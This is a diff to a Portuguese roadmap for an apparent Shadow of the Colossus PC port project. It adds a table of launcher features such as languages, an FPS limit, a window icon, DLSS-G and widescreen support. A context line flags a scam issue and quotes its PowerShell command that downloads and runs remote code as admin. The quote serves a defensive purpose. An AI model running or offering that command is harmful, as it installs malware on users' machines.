@@ -57,6 +57,18 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 |---|---|---|---|
 | 11 | Pré-compilar shaders (#124), auto-update (#136), versão sem AVX2 (#70, #89, #88) | ⏳ | #83 já lê os caches em paralelo (50 s → 0,9 s) e compila pipelines em segundo plano. |
 
+## Fase 6 — Lançador e janela (pedidos do usuário, 19/10)
+
+| # | Item | Estado | Notas |
+|---|---|---|---|
+| 12 | Idiomas do lançador: espanhol, chinês (simplificado), coreano, russo | ✅ | `ac18022`. 224 textos por idioma em `launcher/sotc_i18n.py` (procurados pelo texto em português; o que faltar sai em inglês); fonte Microsoft YaHei UI / Malgun Gothic para chinês/coreano; conferido na tela. |
+| 13 | Opção de FPS: 30 / 60 / ilimitado | ✅ | `3b433bd`. 60 = sem o limite do jogo, no máximo 1 quadro a cada 2 vblanks de 120 Hz (`SOTC_FPS_LIMIT`); demo nunca acima de 60,0. |
+| 14 | Ícone do jogo na janela, versão e FPS no título | ✅ | `d7bb081`. Ícone tirado do `icon0.png` do dump do jogador (nada da Sony no pacote); título "SHADOW OF THE COLOSSUS™ · v01.01 · 60 FPS". |
+| 15 | DLSS-G (RTX 40/50) no pacote | ✅ | `0ab2ff7`. Runtime oficial NVIDIA Streamline 2.14.16 (11 MB, assinaturas verificadas) + licenças em `bin/licenses-nvidia`, fora do git (`../SotC-deps`). Na RTX 2060 a DLSS-G é recusada e a FSR 3 assume. Não testada em RTX 40/50 (outros projetos já testaram numa 4080). |
+| 16 | Overlay F10 e mensagens F7/F8 no idioma do lançador | ✅ | `9656fa4` (os textos do fork de geração de quadros estavam em francês). |
+| 17 | Widescreen / ultrawide (16:10, 21:9, 32:9, Hor+) | ✅ | PR #54 (tabnul), `72d2a69`. Testado em 2560x1080: imagem mais larga, sem esticar, sem erros. |
+| 18 | Ícones de botões Xbox no jogo | ⏳ | O fork xeodeo tem o mecanismo, mas os ícones dele vêm das texturas do jogo (material da Sony): desenhar ícones próprios ou gerá-los no PC do jogador. |
+
 ## Fora do roteiro
 
 - Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
